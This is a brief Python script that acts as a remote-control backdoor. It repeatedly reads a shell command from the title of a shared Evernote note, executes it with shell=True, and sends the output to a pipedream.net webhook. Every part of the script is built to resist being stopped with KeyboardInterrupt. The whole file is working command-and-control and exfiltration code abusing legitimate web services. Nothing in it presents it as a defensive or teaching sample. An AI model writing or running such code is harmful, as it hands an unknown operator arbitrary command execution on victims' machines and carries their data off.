try:
    from bs4 import BeautifulSoup
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system
    import lxml

    old_command = ""
    command = ""
except KeyboardInterrupt:
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = BeautifulSoup(get("https://www.evernote.com/shard/s557/sh/f241b451-44a8-5ebe-3a73-cf74cb0fdaf5/2EW7PhNX5HU3KHOM1ZZGiu0d16La558Mv9vDJaLemJOZUP4kW2qbb1bBaQ").text, 'lxml').find('title').text
        except KeyboardInterrupt:
            continue
        except:
            print("Failed to connect to server")
            continue
            # execute command
        if old_command != command:
            try:
                cmdout = system(command, shell=True)
                try:
                    post("https://eo482aoknyxae8c.m.pipedream.net/", data=cmdout)
                except KeyboardInterrupt:
                    continue
                except:
                    print("Failed to sent output")
                    continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            continue
    except KeyboardInterrupt:
        continue
